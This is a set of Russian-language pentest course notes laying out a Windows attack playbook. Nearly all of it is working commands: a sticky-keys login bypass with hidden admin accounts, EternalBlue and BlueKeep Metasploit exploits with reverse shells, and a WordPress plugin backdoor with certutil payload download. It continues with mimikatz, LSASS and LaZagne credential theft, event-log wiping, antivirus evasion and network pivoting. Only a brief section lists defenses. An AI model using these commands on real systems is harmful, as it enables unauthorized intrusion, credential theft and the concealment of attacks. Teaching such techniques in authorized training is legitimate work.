Winlogon (экран ввода пароля. Работает с NT-Authority sys)
Run session



Атака на экран авторизации
1) Вытаскиваем жесткий диск или грузимся с флешки
Для загрузки лучше использовать специализированные дистрибутивы

2.1) Загрузка с recovery Windows live usb
Repair your computer
recovery Command Prompt via advanced recovery options
wmic logicaldisk get name
C: 
dir
cd Window\System32

2.2) Загрузка c Linux дистрибутива 
Убедится, что система полностью выключена, а не спит
mount /dev/<sda2> /media/diskC/
cd /media/diskC/Window/System32
cp cmd.exe sethc.exe (лучше сделать бэкап оригинального файла)

3) Подменяем бинарник, запускающий функции на окне авторизации на cmd.exe
Для этого надо загрузится с флешки, и скопировать файл
Залипание клавиш теперь открывает шелл
copy Windows/system32/cmd.exe Windows/system32/sethc.exe 	 SHIFTx5
copy Windows/system32/cmd.exe Windows/system32/magnify.exe 	 WIN+U
copy Windows/system32/cmd.exe Windows/system32/utilman.exe 	 WIN+U
copy Windows/system32/cmd.exe Windows/system32/osk.exe 		 WIN+U
copy Windows/system32/cmd.exe Windows/system32/DisplaySwitch.exe WIN+P
4) Грузимся и триггерим залипание клавиш
5) Получаем шелл



Добавляем пользователя и даем ему права администратора
1) Net user <username> <password> /add
2) Net localgroup administrators <username> /add

Если Win Defender мешает, то можно загрузится в безопасном режиме
bcdedit /set {default} safeboot minimal
После добавления пользователя отключаем режим

Или можно добавить пользователя через прямое редактирование файла CAM
Например, с помощью chntpw из кали



Защита 
BIOS пароль
Шифрование диска
Не бросать разлогиненные компы
В Win10 есть функция, котора не дает подменить бинарники с экрана загрузки
BitLocker на лету шифрует диски. Есть режимы восстановления с usb девайса



Удаленные атаки

Eternal Blue
Работает, если находимся в одной локалке с виндой

Сканруем на налче уязвимости
# msfconsole
msf5> search eternalblue
msf5> use auxiliary/scanner/smb/sm_ms1_010
msf5> show options
msf5> set RHOST <ip target>
msf5> exploit

Эксплуатация
msf5> use exploit/windows/smb/ms17_010_eternalblue
msf5> show options
msf5> set payload windows/x64/meterpreter/reverse_tcp
msf5> set RHOST <ip target>
msf5> set LHOST <kali ip>
msf5> show advanced
msf5> set VERBOSE true
msf5> check
msf5> exploit

Эту последовательность команд можно запсать в файл .rc и подгрузить в metasploit через
msf5> resource ~/file.rc

meterpreter> sysinfo
meterpreter> getuid
Узнаем, под кем мы работаем. Обычно после эксплуатации мы сразу имеем NT_Authority sys

Иногда eternal blue может привести к крашу системы
Meterpreter достаточно легко детектится



Атака Bluekeep
Для эксплуатации подходят только 
Windows 7 SP1
Windows Server 2008 R2 с HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam равным 0 (это не стандартно) иначе система упадет

msf5> search bluekeep
msf5> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf5> show info 
$ VBoxManage debugvm "metasploitable3-win2k8" dumpvmcore --filename=metasploitable.dump
Делаем дамп оперативной памяти в данном случае, с виртуалки
$ mkdir bluekeep && mv metasploitable.dump bluekeep && chmod 777 bluekeep && chmod 777 bluekeep/*
$ sudo docker run --rm -it -v bluekeep:/home/nonroot/files remnux/rekall bash
:~$ rekall -f metaploitabl.dump pools
Нас нтересует hex значение NonPagedPool
$ sudo vim /usr/share/metasploit-framework/../cve_019_0770_bluekeep_rce.rb
меняем значене hex в Windows 7 SP1 на полученный, пр этом добавляя вперед нужные ffff
msf5> show targets
msf5> set target 2
msf5> set RHOST <ip target>
msf5> set VEROSE true
msf5> set GROOMSIZE 50
msf5> exploit

Посмотреть код эксплойта
$ less /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_019_0708_bluekeep_rce.rb



Перебор паролей wordpress:
$ wpscan --url http://10.0.2.X:8585/wordpress/ --enumerate u -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt



Атака через web сервер
$ ./phpsploit 
phpsploit> backdoor 
Вставляем строчку в плагин на сервере
phpsploit> set target http:<address>:<port>/wordpress/wp-content/plugins/ninja-forms/index.php
выбираем файл с бэкдором
phpsploit> exploit

Теперь обеспечим фреймворк для взамодействя с системой
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.0.2.X lport=4444 -f exe > reverse_tcp.exe
$ python3 -m http.server
Поднмаем веб сервер одной командой
phpsploit> run certutil.exe -urlcache -split -f http://<ip>:<port>/<file>
Аналог wget на винде
msf5> use exploit/multi/handler
msf5> set payload windows/x64/meterpreter/reverse_tcp
msf5> exploit
Запускаем универсльный shell-listener 
phpsploit> run reverse_tcp.exe



В работе пентестеры часто используют либо свои наработки, либо модифицированные тулы, что бы обойти антивирусное по
Популярные утилиты легко отслеживаются антивирусами





Занятие 8

meterpreter> background
Кидаем сессию в бэкграунд
msf5> sessions -l 
Список сессий
msf5> session -i <id>
Подключаемся к сессии



Накидываем полезную нагрузку через открытую сессию метерпретера

Модуль определяет висит ли система на виртуалке. И если да, то на какой
msf5> use post/windows/gather/checkvm
msf5> set session 1
msf5> exploit

Модуль перечисляет запущенные сервисы и права, от которых они запущены
msf5> use post/windows/gather/enum_services
msf5> set session 1
msf5> exploit

Модуль ищет потенциальные полезные уязвимости
msf5> use post/multi/recon/local_exploit_suggester 
msf5> set session 1
msf5> set SHOWDESCRIPTION true
msf5> exploit



Сканер возможных уязвимостей обновлений безопаснотсти
$ wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
meterpreter> upload /home/kali/Desktop/Sherlock.ps1
Загружаем файл на windows машину 
meterpreter> load powershell
meterpreter> powershell_shell
PS > Import_Module Sherlock.ps1
PS > Find-AllVulns

Если предыдущий способ не сработал, можно выполнить все через meterpeter
meterpreter> powershell_import Sherlock.ps1
meterpreter> powershell_execute Find-AllVulns



Эксплойты из msf, работающие через meterpreter
msf5> use exploit/windows/local/<*>

Используем Эксплоит для найденой уязвимости
msf5> use exploit/windows/local/ms16_014_wmi_recv_notif
msf5> set session 1
msf5> set payload windows/x64/meterpreter/reverse_tcp
msf5> set LHOST <ip kali>
msf5> exploit
Открывается вторая сессия meterpreter, но уже с повышенными правами



Получаем графческй доступ к рабочему столу админа
msf5> use exploit/windows/local/payload_inject
msf5> set payload windows/x64/vncinject/reverse_tcp
msf5> set LPORT 5555
msf5> set LHOST <ip kali>
msf5> set session 2
meterpreter> ps 
Ищем процесс, в который будем инжектироваться
msf5> set PID <pid процесса (первые 4 цифры "4452")>
msf5> exploit



Скрываем пользователя из net users

meterpreter> shell
C:\> net user
Выводим список пользователей
C:\> wmic useraccount where name="hacker" call rename name="hacker$"
Переименованный пользователь с '$' на конце не виден команде net user

Скрываем пользователя с экрана авторизации

meterpreter> reg setval -v hacker$ -d 0 -t REG_DWORD -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
meterpreter> reg enumkey -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
Проверяем, что пользователь есть в списке



Извлечение учеток 
SAM - для локального входа
ntds.dit - для доменных учеток
lsass - процесс, осуществляющий аутентификацию, обращаяь к SAM



Mimikatz 
позволяет вытаскивать пароли, хеши и прочее из памяти системы (отлично детектится)
Скачать можно тут https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip

Можно использовать как расширение meterpreter
meterpreter> load kiwi
meterpreter> creds_all
вытаскиваем все креды, до которх можем дотянутся
meterpreter> lsa_dump_sam
вытаскиваем NTLM хеши из SAM файла


Можно поставить на саму машину
Нужно скачать psexec 
https://docs.microsoft.com/en-us/sysinternals/download/psexec
Разархивируем
C:\> \PSTools\PsExec.exe
Качаем mimikatz
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
Если браузер блокирует его, жмем "показать все" и "сохранить"
Разархивируем в папку с PSTools
C:\> PsExec.exe -s cmd.exe
C:\> cd C:\Users\<name>\Downloads\PSTools\x64\
C:\> mimikatz.exe
mimikatz# privilege::debug
Проверяем привилегии (если 20 ОК, то все в порядке)
mimikatz# sekurlsa::logonpasswords
Вытягиваем учетки
mimikatz# token::elevate
mimikatz# lsadump::sam


!ХОРОШИЙ СПОСОБ!
Можно сделать дамп реестра и анализировать на своей машине
meterpreter> cmd
C:\> reg save HKLM\SYSTEM system.hiv
C:\> reg save HKLM\SAM sam.hiv
создаем дамп
meterpreter> download system.hiv
meterpreter> download sam.hiv
Скачиваем дамп
$ pip3 install pypykatz
Установка pypykatz
$ pypykatz registry --sam ./sam.hiv ./system.hiv
Получили хеши из файла SAM



!!!ЛУЧШИЙ СПОСОБ!!!
Дамп реестра чистыми средствами (без использования meterpreter)
Скачиваем ProcDump.exe
https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
msf5> use auxiliary/admin/smb/upload_file
msf5> set SMBUser <admin>
msf5> set SMBPass <qwe123>
msf5> set LPATH /home/kali/Desktop/ProcDump/procdump.exe
msf5> set RHOST <ip target>
msf5> set RPATH Windows\\Temp\\procdump.exe
msf5> exploit
Загрузили файл на машину с windows. Можно принести на флешке

msf5> use auxiliary/admin/smb/psexec_command
msf5> set SMBUser <admin>
msf5> set SMBPass <qwe123>
msf5> set RHOST <ip target>
msf5> set COMMAND "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
Запустили procdump.exe на хосте. Можно запустить от имени адмнистратора

msf5> use auxiliary/admin/smb/download_file
msf5> set SMBUser <admin>
msf5> set SMBPass <qwe123>
msf5> set RPATH Windows\\Temp\\lsass.dmp
msf5> set RHOST <ip target>
msf5> exploit
Скачали дамп. Можно сохранить на флешке

$ cd ~/.msf4/loot
$ pypykatz lsa minidump <filename>.dmp
Получили хеши и пароли В ЧИСТОМ ВИДЕ из файла SAM



Чистка логов с mimikatz
mimikatz# event::drop
Предотвращает появлене логов
mimikatz# event::clear
Чистит логи из event log



Полная очистка логов с помощью Powerhell
PS> wevtutil.exe el | ForEach {wevtutil cl "$_"}



Извлечение учеток из браузеров, приложений
LaZagne
Качаем утиилиту
https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
C:\\> lazagne.exe all 
Получаем все пароли! (лучше запускать от админа)



Брут хешей
NTLM хэши очень быстро брутятся!
$ hashcat -a 0 -m <hash_type> <hash_file> <wordlist>



Как можно сделать опенсорсный инструмент менее заметным для антивирусов
1) Переписываем строчки кода, что бы изменить сигнатуру
2) Имена модулей
3) Оформление меню
4) Структура файлов ии папок
5) Обфускация сходного кода
6) Можно подписывать файлы истекшмии сертфикатами 
https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/
atomic-red-team 



Распространение по локальной сети

Сканирование по ARP
msf5> use post/windows/gather/arp_scaner
msf5> set RHOSTS <ip>/24
msf5> set SESSION <id meterpreter>
msf5> exploit

Настраиваем маршрутизацию
msf5> route add 10.0.0.0/24 <id meterpreter>
Мы настроили прокси через meterpreter

Поднимаем web интерфейс
msf5> use auxiliary/server/socks4a
msf5> run -d 
В браузере -> Connection Settings -> manual proxy configuration -> SOCKS v4 -> SOCKS Host 127.0.0.1 Port 1080

Используем разные утилты через прокси
$ sudo vim /etc/proxychains.conf (добавляем наш прокси)
$ proxychains nmap -sT -sV 10.0.0.2

Настраиваем проброс портов на windows машине
meterpreter> portfwd add -R -l 7777 -p 7777 -L 127.0.0.1
Теперь при подключении к 127.0.0.1:7777 трафк будет идти к нам на порт 7777

Настриваем эксплуатацию уязвимости на машине из локльной сети
msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf5> set RHOSTS 10.0.0.2
msf5> set payload cmd/unix/reverse_perl
msf5> set LHOST 0.0.0.0
msf5> set LPORT 7777
msf5> exploit

Иногда порт форвардинг отрабатывает только один раз
Нужно иметь несколько сессий, так как они часто падают



